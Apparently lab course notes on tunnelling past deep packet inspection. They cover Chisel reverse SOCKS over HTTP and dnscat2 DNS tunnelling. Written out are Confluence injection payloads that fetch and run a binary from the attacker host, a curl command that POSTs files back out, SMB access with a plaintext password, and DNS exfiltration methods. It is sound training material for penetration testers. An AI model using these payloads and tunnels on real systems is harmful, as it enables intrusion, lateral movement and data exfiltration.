# Tunneling Through Deep Packet Inspection

Deep packet inspection1 is a technology that's implemented to monitor traffic based on a set of rules. It's most often used on a network perimeter, where it can highlight patterns that are indicative of compromise.

Deep packet inspection devices may be configured to only allow specific transport protocols into, out of, or across the network. For example, a network administrator could create a rule that terminates any outbound SSH traffic. If they implemented that rule, all connections that use SSH for transport would fail, including any SSH port redirection and tunneling strategies we had implemented.

Given the variety of restrictions that may be implemented on a network, we need to learn and leverage a number of different tunneling tools and strategies to successfully bypass technologies like deep packet inspection.

## HTTP Tunneling Fundamentals

Let's begin our exploration of HTTP tunneling by introducing a simple scenario. In this case, we have compromised CONFLUENCE01, and can execute commands via HTTP requests. However, once we try to pivot, we are blocked by a considerably restrictive network configuration.

Specifically, a Deep Packet Inspection (DPI) solution is now terminating all outbound traffic except HTTP. In addition, all inbound ports on CONFLUENCE01 are blocked except TCP/8090. We can't rely on a normal reverse shell as it would not conform to the HTTP format and would be terminated at the network perimeter by the DPI solution. We also can't create an SSH remote port forward for the same reason. The only traffic that will reach our Kali machine is HTTP, so we could, for example, make requests with Wget and cURL.

## HTTP Tunneling with Chisel

The above is a perfect scenario for Chisel, an HTTP tunneling tool that encapsulates our data stream within HTTP. It also uses the SSH protocol within the tunnel so our data will be encrypted.

Chisel uses a client/server model. A Chisel server must be set up, which can accept a connection from the Chisel client. Various port forwarding options are available depending on the server and client configurations. One option that is particularly useful for us is reverse port forwarding, which is similar to SSH remote port forwarding.

We will run a Chisel server on our Kali machine, which will accept a connection from a Chisel client running on CONFLUENCE01. Chisel will bind a SOCKS proxy port on the Kali machine. The Chisel server will encapsulate whatever we send through the SOCKS port and push it through the HTTP tunnel, SSH-encrypted. The Chisel client will then decapsulate it and push it wherever it is addressed.

The traffic between the Chisel client and server is all HTTP-formatted. This means we can traverse the deep packet inspection solution regardless of the contents of each HTTP packet. The Chisel server on our Kali machine will listen on TCP port 1080, a SOCKS proxy port. All traffic sent to that port will be passed back up the HTTP tunnel to the Chisel client, where it will be forwarded wherever it's addressed.

Once chisel is installed on the remote system:

```bash
kali@kali:~$ curl http://192.168.247.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.176/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
kali@kali:~$ tail -f /var/log/apache2/access.log # Verify that the chisel file was transferred
```

Now that we have the Chisel binary on both our Kali machine and the target, we can run them. On the Kali machine, we'll start the binary as a server with the server subcommand, along with the bind port (--port) and the --reverse flag to allow the reverse port forward.

```bash
kali@kali:~$ chisel server --port 8080 --reverse
```

Before we try to run the Chisel client, we'll run tcpdump on our Kali machine to log incoming traffic. We'll start the capture filtering to tcp port 8080 to only capture traffic on TCP port 8080.

We want to connect to the server running on our Kali machine (192.168.118.4:8080), creating a reverse SOCKS tunnel (R:socks). The R prefix specifies a reverse tunnel using a socks proxy (which is bound to port 1080 by default). The remaining shell redirections (> /dev/null 2>&1 &) force the process to run in the background, so our injection does not hang waiting for the process to finish.

The Chisel client command we run from the web shell:

```bash
/tmp/chisel client 192.168.45.176:8080 R:socks > /dev/null 2>&1 &
```

We'll convert this into a Confluence injection payload, and send it to CONFLUENCE01:

```bash
kali@kali:~$ curl http://192.168.247.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.176:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

However, nothing happens. We don't see any traffic hit our Tcpdump session, and the Chisel server output doesn't show any activity.

This indicates there may be something wrong with the way we're running the Chisel client process on CONFLUENCE01. However, we don't have direct access to the error output when running the binary. We need to figure out a way to read the command output, which may be able to point us towards the problem. We should then be able to solve it.

To read the command output, we can construct a command which redirects stdout and stderr output to a file, and then send the contents of that file over HTTP back to our Kali machine. We use the &> operator, which directs all streams to stdout, and write it to /tmp/output. We then run curl with the --data flag, telling it to read the file at /tmp/output, and POST it back to our Kali machine on port 8080.

The error-collecting-and-sending command string:

```bash
/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
```

We can then create an injection payload using this command string, and send it to the vulnerable Confluence instance:

```bash
kali@kali:~$ curl http://192.168.247.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.176:8080/%27%29.start%28%29%22%29%7D/
```

---
If it doesn't work:

On sending this new injection, we check Tcpdump output for attempted connections, and find that a required package is not installed on the Confluence server.

```
...
16:30:50.915895 IP (tos 0x0, ttl 61, id 47823, offset 0, flags [DF], proto TCP (6), length 410)
    192.168.50.63.50192 > 192.168.118.4.8080: Flags [P.], cksum 0x1535 (correct), seq 1:359, ack 1, win 502, options [nop,nop,TS val 391724691 ecr 3105669986], length 358: HTTP, length: 358
        POST / HTTP/1.1
        Host: 192.168.118.4:8080
        User-Agent: curl/7.68.0
        Accept: */*
        Content-Length: 204
        Content-Type: application/x-www-form-urlencoded

        /tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by /tmp/chisel)/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/chisel) [|http]
        0x0000:  4500 019a bacf 4000 3d06 f729 c0a8 db3f  E.....@.=..)...?
        0x0010:  c0a8 2dd4 c410 1f90 d15e 1b1b 2b88 002d  ..-......^..+..-
...
```

We can simply try an earlier version of Chisel on the server to solve this problem.

```bash
kali@kali:~$ wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
kali@kali:~$ gunzip chisel_1.8.1_linux_amd64.gz
kali@kali:~$ sudo cp ./chisel /var/www/html  
```

After repeating the process, if you think it works, you can check the status of our SOCKS proxy with ss:

```bash
ss -ntplu
```

Our SOCKS proxy port 1080 is listening on the loopback interface of our Kali machine.

Let's use this to connect to the SSH server on PGDATABASE01. In Port Redirection and SSH Tunneling, we created SOCKS proxy ports with both SSH remote and classic dynamic port forwarding, and used Proxychains to push non-SOCKS-native tools through the tunnel. But we've not yet actually run SSH itself through a SOCKS proxy.

SSH doesn't offer a generic SOCKS proxy command-line option. Instead, it offers the ProxyCommand configuration option. We can either write this into a configuration file, or pass it as part of the command line with -o.

ProxyCommand accepts a shell command that is used to open a proxy-enabled channel. The documentation suggests using the OpenBSD version of Netcat, which exposes the -X flag and can connect to a SOCKS or HTTP proxy. However, the version of Netcat that ships with Kali doesn't support proxying.

Instead, we'll use Ncat, the Netcat alternative written by the maintainers of Nmap. We can install this on Kali with sudo apt install ncat.

```bash
sudo apt install ncat
```

Now we'll pass an Ncat command to ProxyCommand. The command we construct tells Ncat to use the socks5 protocol and the proxy socket at 127.0.0.1:1080. The %h and %p tokens represent the SSH command host and port values, which SSH will fill in before running the command.

```bash
kali@kali:~$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
...
database_admin@pgbackup1:~$
```

We gained access to the SSH server, through our Chisel reverse SOCKS proxy, tunneling traffic through a reverse HTTP tunnel.

We created a reverse tunnel using Chisel, and then used this tunnel to log in to an SSH server on PGDATABASE01 within the internal network. We did this with only HTTP-formatted traffic to and from the compromised CONFLUENCE01 pivot server.

**If you wanna run commands through the proxy, simply modify your proxychains conf file to use socks5 on 127.0.0.1 on port 1080 and do the thing.**

## DNS Tunneling

DNS is one of the foundational Internet protocols and has been abused by attackers for various nefarious purposes. For example, it can serve as a mechanism to tunnel data indirectly in and out of restrictive network environments. To understand exactly how this works, let's present a simplified "crash course" in DNS. We will then learn how to perform DNS tunneling with a tool called dnscat2.

### DNS Tunneling with dnscat2

We can use dnscat2 to exfiltrate data with DNS subdomain queries and infiltrate data with TXT (and other) records.

A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines.

Let's try out dnscat2. We'll inspect traffic from FELINEAUTHORITY with tcpdump, filtering specifically on UDP port 53 (udp port 53).

```bash
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
```

We'll kill our existing Dnsmasq process with a Ctrl+c and run dnscat2-server instead, passing the feline.corp domain as the only argument.

```bash
kali@felineauthority:~$ dnscat2-server feline.corp
```

This indicates that the dnscat2 server is listening on all interfaces on UDP/53.

Now that our server is set up, we'll move to PGDATABASE01 to run the dnscat2 client binary. The binary is already on the server for this exercise. However, we could have transferred the binary from our Kali machine to PGDATABASE01 via our SSH connection using SCP.

Thinking about exfiltration techniques (like DNS tunneling) may seem to present a "chicken or the egg" problem. How do we get the DNS tunneling client onto a host if we don't have command execution? Exfiltration is simply a tool we'll use to transfer data. It should be coupled with an exploitation vector that provides access to the target network.

We'll run the dnscat2 client binary from the dnscat folder in the database_admin home directory, with the feline.corp domain passed as the only argument.

```bash
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
...
Session established!
```

We can check for connections back on our dnscat2 server:

```bash
kali@felineauthority:~$ dnscat2-server feline.corp
...
dnscat2> New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Annoy Mona Spiced Outran Stump Visas

dnscat2>
```

Our session is connected! DNS is working exactly as expected. Requests from PGDATABASE01 are being resolved by MULTISERVER03, and end up on FELINEAUTHORITY.

When run without a pre-shared --secret flag at each end, dnscat2 will print an authentication string. This is used to verify the connection integrity after the encryption has been negotiated. The authentication string in this case ("Annoy Mona Spiced Outran Stump Visas") is the same on both client and server, so we know there's no in-line tampering. Every time a connection is made, the authentication string will change.

We can use our tcpdump process to monitor the DNS requests to feline.corp. The dnscat2 process is using CNAME, TXT, and MX queries and responses. As indicated by this network data, DNS tunneling is certainly not stealthy! This output reveals a huge data transfer from the dnscat2 client to the server. All the request and response payloads are encrypted, so it's not particularly beneficial to keep logging the traffic. We'll go ahead and kill tcpdump with Ctrl+c.

Now we'll start interacting with our session from the dnscat2 server. Let's list all the active windows with the windows command, then run window -i from our new "command" shell to list the available commands.

```bash
dnscat2> windows
...
dnscat2> window -i 1
...
command (pgdatabase01) 1> ?
```

Since we're trying to tunnel in this Module, let's investigate the port forwarding options. We can use listen to set up a listening port on our dnscat2 server, and push TCP traffic through our DNS tunnel, where it will be decapsulated and pushed to a socket we specify. Let's background our console session by pressing Ctrl+z. Back in the command session, let's run listen --help.

```bash
command (pgdatabase01) 1> listen --help
```

According to the help message output, listen operates much like ssh -L. And we should be very familiar with that by now.

Let's try to connect to the SMB port on HRSHARES, this time through our DNS tunnel. We'll set up a local port forward, listening on 4455 on the loopback interface of FELINEAUTHORITY, and forwarding to 445 on HRSHARES.

```bash
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
```

From another shell on FELINEAUTHORITY we can list the SMB shares through this port forward.

```bash
kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```

The connection is slower than a direct connection, but this is expected given that our SMB packets are being transported through the dnscat2 DNS tunnel. TCP-based SMB packets, encapsulated in DNS requests and responses transported over UDP, are pinging back and forth to the SMB server on HRSHARES, deep in the internal network. Excellent!

We used dnscat2 to tunnel SMB traffic through DNS requests and responses. We used that to list the available shares on a host deep inside the internal network, despite the fact that neither HRSHARES or PGDATABASE01 had direct connectivity to our FELINEAUTHORITY server.

### DNS Tunneling Fundamentals

IP addresses, not human-readable names, are used to route Internet data. Whenever we want to access a domain by its domain name, we need first obtain its IP address. To retrieve (or resolve) the IP address of a human-readable address, we need to ask various DNS servers. Let's walk through the process of resolving the IPv4 address of "www.example.com".

In most cases, we'll ask a DNS recursive resolver1 server for the DNS address record (A record) of the domain. An A record is a DNS data type that contains an IPv4 address. The recursive resolver does most of the work: it will make all the following DNS queries until it satisfies the DNS request, then returns the response to us.

Once it retrieves the request from us, the recursive resolver starts making queries. It holds a list of root name servers (as of 2022, there are 13 of them scattered around the world). Its first task is to send a DNS query to one of these root name servers. Because example.com has the ".com" suffix, the root name server will respond with the address of a DNS name server that's responsible for the .com top-level domain (TLD). This is known as the TLD name server.

The recursive resolver then queries the .com TLD name server, asking which DNS server is responsible for example.com. The TLD name server will respond with the authoritative name server for the example.com domain.

The recursive resolver then asks the example.com authoritative name server for the IPv4 address of www.example.com. The example.com authoritative name server replies with the A record for that.

The recursive resolver then returns that to us. All these requests and responses are transported over UDP, with UDP/53 being the standard DNS port.

It's common to use the recursive resolver provided by an ISP (which is usually pre-programmed into the stock ISP router), but other well-known public recursive name servers can be used as well. For example, Google has a public DNS server at 8.8.8.8.

Exfiltrating small chunks of plaintext data is one thing, but imagine we have a binary file we want to exfiltrate from PGDATABASE01. How might we do that?

This would require a series of sequential requests. We could convert a binary file into a long hex string representation, split this string into a series of smaller chunks, then send each chunk in a DNS request for [hex-string-chunk].feline.corp. On the server side, we could log all the DNS requests and convert them from a series of hex strings back to a full binary. We won't go into further details here, but this should clarify the general concept of DNS network exfiltration.

Now that we have covered the process of exfiltrating data from a network, let's consider how we might infiltrate data into a network.

The DNS specification includes various records.13 We've been making A record requests so far. An A record response contains an IPv4 address for the requested domain name.

But there are other kinds of records, some of which we can use to smuggle arbitrary data into a network. One of these is the TXT record. The TXT record is designed to be general-purpose, and contains "arbitrary string information".14

We can serve TXT records from FELINEAUTHORITY using Dnsmasq. First, we'll kill our previous dnsmasq process with a C+c. Then we'll check the contents of dnsmasq_txt.conf and run dnsmasq again with this new configuration.

```bash
kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.

kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
dnsmasq: started, version 2.88 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq: warning: no upstream servers configured
dnsmasq: cleared cache
```

The dnsmasq_txt.conf contains two extra lines starting with "txt-record=". Each of these lines represents a TXT record that Dnsmasq will serve. Each contains the domain the TXT record is for, then an arbitrary string attribute,14:1 separated by a comma. From these two definitions, any TXT record requests for www.feline.corp should return the strings "here's something useful!" and "here's something else less useful.".

Let's test this hypothesis. Back on PGDATABASE01, we'll make a request for TXT records for www.feline.corp with nslookup by passing the -type=txt argument.

```bash
database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
Server:		192.168.50.64
Address:	192.168.50.64#53

Non-authoritative answer:
www.feline.corp	text = "here's something useful!"
www.feline.corp	text = "here's something else less useful."

Authoritative answers can be found from:

database_admin@pgdatabase01:~$
```

We received the arbitrary string attributes that were defined in dnsconfig_txt.conf.

This is one way to get data into an internal network using DNS records. If we wanted to infiltrate binary data, we could serve it as a series of Base64 or ASCII hex encoded TXT records, and convert that back into binary on the internal server.

We discussed how we might infiltrate or exfiltrate data through various types of DNS records.

